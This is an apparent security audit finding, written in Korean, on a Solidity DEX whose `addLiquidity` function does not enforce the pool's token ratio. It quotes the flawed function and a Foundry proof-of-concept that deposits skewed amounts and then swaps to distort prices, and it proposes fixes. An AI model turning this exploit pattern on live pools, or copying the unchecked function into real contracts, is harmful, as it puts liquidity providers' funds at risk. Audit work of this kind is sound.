## medium - 토큰 유동성 풀의 AMM이 손상되어 비정상적인 가격 변동이 발생할 수 있습니다.

### 설명

./src/Dex.sol: 25-47

function addLiquidity(uint _amountX, uint _amountY, uint _minLpReturn) public returns (uint lpReturnValue)

```solidity
function addLiquidity(uint amountX, uint amountY, uint minLP) external returns (uint lpTokens) {
      require(tokenX.allowance(msg.sender,address(this))>= amountX && tokenY.allowance(msg.sender,address(this))>= amountY,"ERC20: insufficient allowance");
      require(tokenX.balanceOf(msg.sender)>=amountX && tokenY.balanceOf(msg.sender)>=amountY,"ERC20: transfer amount exceeds balance");
      require(amountX > 0 && amountY > 0);
      // 유동성 풀에 아무 것도 없으면 
      if (totalLiquidity == 0) {
          reserveX = amountX;
          reserveY = amountY;
          lpTokens = sqrt(amountX * amountY);
          totalLiquidity = lpTokens;
      } 
      else {
        // 기존 풀에 유동성 추가
        uint liquidityX = (totalLiquidity * amountX) / reserveX;
        uint liquidityY = (totalLiquidity * amountY) / reserveY;

        // 더 작은 값을 선택하여 풀의 균형을 유지
        lpTokens = (liquidityX < liquidityY) ? liquidityX : liquidityY;

        require(lpTokens >= minLP);

        totalLiquidity += lpTokens;
    }
      liquidity[msg.sender] += lpTokens;
      tokenX.transferFrom(msg.sender, address(this), amountX);
      tokenY.transferFrom(msg.sender, address(this), amountY);

      reserveX = tokenX.balanceOf(address(this));
      reserveY = tokenY.balanceOf(address(this));
      return lpTokens;
  }
```

`addLiquidity` 함수에서 인자로 들어온 _amountX, _amountY의 값이 실제 유동성 풀의 토큰 비율과 일치하는지에 대한 검사가 존재하지 않습니다.

이에 따라 amountX, amountY만큼의 토큰이 모두 유동성 풀에 추가되어 유동성 풀 내의 토큰 비율이 손상될 수 있습니다.

### 파급력

Medium - 유동성 공급 비율에 대한 검사가 이루어지지 않아, 공격자가 임의로 토큰 비율을 조정 할 수 있습니다.

```solidity
contract DexScript is Test {
    Dex public dex;
    IERC20 tokenX;
    IERC20 tokenY;

    function setUp() public {
        tokenX = new CustomERC20("X");
        tokenY = new CustomERC20("Y");
        dex = new Dex(address(tokenX), address(tokenY));
        tokenX.approve(address(dex), type(uint256).max);
        tokenY.approve(address(dex), type(uint256).max);

        dex.addLiquidity(800 ether, 700 ether, 0);
    }

    function test_exploit() public {
        
        uint LPReturn1 = dex.addLiquidity(8 ether, 7 ether, 0);
        console.log("LPReturn1: ", LPReturn1);

        uint swap1 = dex.swap(0, 100 ether, 0);
        console.log("swap1: ", swap1);

        
    }

    function test_exploit2() public {
        uint LPReturn2 = dex.addLiquidity(10000 ether, 1, 0);
        console.log("LPReturn2: ", LPReturn2);

        uint swap2 = dex.swap(0, 100 ether, 0);
        console.log("swap2: ", swap2);
    }
}
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/dcc66554-0f51-432b-b52f-51edb25200cb/ec12c0d9-35dc-4683-80e5-30f0cdb65145/image.png)

1. 특정 토큰의 유동성 비율을 매우 높거나 낮게 공급하여 토큰의 가격을 조정할 수 있습니다.

### 해결 방안

1. addLiquidity 함수의 인자가 아닌 실제로 추가되어야할 토큰의 양을 현재 유동성 풀의 비율에 대해 계산하여 transfer하는 방법을 사용할 수 있습니다.
    1. amountX, amountY 중 실제로 유동성 풀에 추가될 수 있는 양(`aX`, `bX`을 계산)
    2. 아래와 같이, 계산된 토큰의 양을 transferFrom 합니다.
    `tokenX.transferFrom(msg.sender, address(this), aX);`
    `tokenY.transferFrom(msg.sender, address(this), aY);`
2. 유동성 풀의 토큰 양을 reserve 변수로 사용하고, skim 함수를 implement하여 필요한 경우 유동성 풀의 비율을 맞춰줄 수 있습니다.
    
    ```solidity
    function skim(address to) external lock {
            address _token0 = token0; // gas savings
            address _token1 = token1; // gas savings
            _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
            _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
        }
    ```
